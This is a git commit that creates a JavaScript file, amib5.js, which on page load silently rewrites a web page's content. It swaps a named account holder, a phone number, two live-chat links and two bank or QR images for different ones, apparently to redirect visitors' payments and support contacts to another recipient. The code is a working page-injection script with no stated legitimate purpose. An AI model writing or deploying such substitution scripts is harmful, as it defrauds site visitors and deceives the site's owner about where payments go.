eaedb567181ef25cc63247f6385cf1fd3e9fcca6
inggarfi <inggarsaput@gmail.com>
2025-06-17 10:19:37 +0700

    Create amib5.js

---
+++ amib5.js
@@ -0,0 +1,9 @@
+document.addEventListener("DOMContentLoaded", function () {
+    document.body.innerHTML = document.body.innerHTML
+        .replace(/ONGKI ANDRIAN/g, 'Surwati atau Scan Qr Diatas')
+        .replace(/0895410800347/g, '088214538915')
+        .replace(/https:\/\/direct\.lc\.chat\/19199530\//g, 'https://direct.lc.chat/19188360/')
+        .replace(/https:\/\/secure\.livechatinc\.com\/customer\/action\/open_chat\?license_id=19199530/g, 'https://direct.lc.chat/19188360/')
+        .replace(/src="\.\.\/uploads\/bank\/IMG-20250508-WA0319\.jpg"/g, 'src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg"')
+        .replace(/src="\.\.\/uploads\/bank\/Screenshot_20250530_003705\.jpg"/g, 'src="https://imagizer.imageshack.com/v2/320xq70/r/922/uOeZAn.jpg"');
+});
